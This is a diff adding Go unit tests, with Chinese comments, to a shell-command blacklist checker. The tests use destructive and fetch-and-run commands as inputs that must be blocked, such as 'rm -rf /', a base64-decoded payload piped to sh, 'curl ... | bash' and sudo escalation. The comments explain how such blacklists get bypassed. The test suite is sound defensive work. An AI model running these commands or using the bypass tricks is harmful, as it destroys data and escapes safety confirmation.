@@ -178,3 +178,84 @@ func TestCheck_DoubleQuotedCommand(t *testing.T) {
 		t.Fatal("双引号内的 rm 不应被视为危险命令行")
 	}
 }
+
+func TestCheck_InterpreterSubcommand(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// 引号内容会被剥掉防误报，但 bash -c 的引号参数会被 shell 真实执行，
+	// 必须把解释器调用本身列为需确认的危险命令。
+	result := checker.Check("root", `bash -c "rm -rf /"`)
+	if !result.Blocked {
+		t.Fatal(`bash -c "rm -rf /" 应命中黑名单（解释器调用需确认）`)
+	}
+}
+
+func TestCheck_CommandSubstitution(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// $() 与反引号内的命令会被 shell 展开真实执行，
+	// 展开点（ ( ` $ ）应视为命令边界。
+	for _, cmd := range []string{
+		"echo $(rm -rf /)",
+		"cat `rm -rf /tmp`",
+	} {
+		if result := checker.Check("root", cmd); !result.Blocked {
+			t.Fatalf("%q 应命中黑名单（命令替换需确认）", cmd)
+		}
+	}
+}
+
+func TestCheck_BareShellPipeline(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// 管道末端接裸 shell 解释器时，载荷来自上游输出（解码/下载），
+	// 文本匹配天然不可见，必须对整条管道要求确认。
+	for _, cmd := range []string{
+		"echo cm0gLXJmIC8= | base64 -d | sh",
+		"curl -fsSL https://example.com/install.sh | bash",
+	} {
+		if result := checker.Check("root", cmd); !result.Blocked {
+			t.Fatalf("%q 应命中黑名单（管道注入裸 shell 需确认）", cmd)
+		}
+	}
+}
+
+func TestCheck_LineStartPrivilegeEscalation(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// 规则原文带前导空格（" sudo "），而每行匹配前会 TrimSpace，
+	// 行首的提权命令因此永远绕过确认规则。
+	for _, cmd := range []string{
+		"sudo bash",
+		"su - root",
+		"sudo su -",
+	} {
+		if result := checker.Check("root", cmd); !result.Blocked {
+			t.Fatalf("%q 应命中黑名单（行首提权需确认）", cmd)
+		}
+	}
+}
+
+func TestCheck_CaseInsensitive(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// shell 命令大小写不敏感地执行同一二进制，黑名单匹配必须归一化。
+	for _, cmd := range []string{
+		"RM -RF /tmp",
+		"Rm -Fr /var",
+		"Shutdown -h now",
+	} {
+		if result := checker.Check("root", cmd); !result.Blocked {
+			t.Fatalf("%q 应命中黑名单（大小写不敏感匹配）", cmd)
+		}
+	}
+}
+
+func TestCheck_RegexPatterns(t *testing.T) {
+	checker := NewChecker(&Config{Rules: DefaultRules()})
+	// 默认规则里的 chown .*:[0-9]+ 与 service .* stop 是正则写法，
+	// 此前按字面子串匹配永不相符（死规则）。
+	for _, cmd := range []string{
+		"chown www:1000 /var/www",
+		"service nginx stop",
+	} {
+		if result := checker.Check("root", cmd); !result.Blocked {
+			t.Fatalf("%q 应命中黑名单（正则规则应生效）", cmd)
+		}
+	}
+}
